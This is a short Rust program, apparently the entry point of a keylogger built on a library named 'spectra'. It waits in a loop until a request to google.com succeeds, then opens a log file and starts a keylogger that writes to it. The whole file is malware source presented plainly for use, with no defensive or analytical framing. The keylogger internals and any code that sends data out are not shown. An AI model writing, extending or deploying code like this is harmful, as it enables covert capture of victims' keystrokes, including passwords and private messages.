use spectra::components::{keylogger, filecreator};
use reqwest::Client;
use std::{thread, time::Duration};

#[tokio::main]
async fn main() {
    loop {
        match Client::new().get("https://www.google.com").send().await {
            Ok(_) => {
                break;
            }
            Err(e) => {
                eprintln!("Failed to establish internet connection: {}", e);
                thread::sleep(Duration::from_secs(30));
            }
        }
    }
    
    if let Ok(file) = filecreator::filehandler() {
        keylogger::activate_keylogger(file);
    } else {
        eprintln!("Failed to create or open log file.");
    }
}
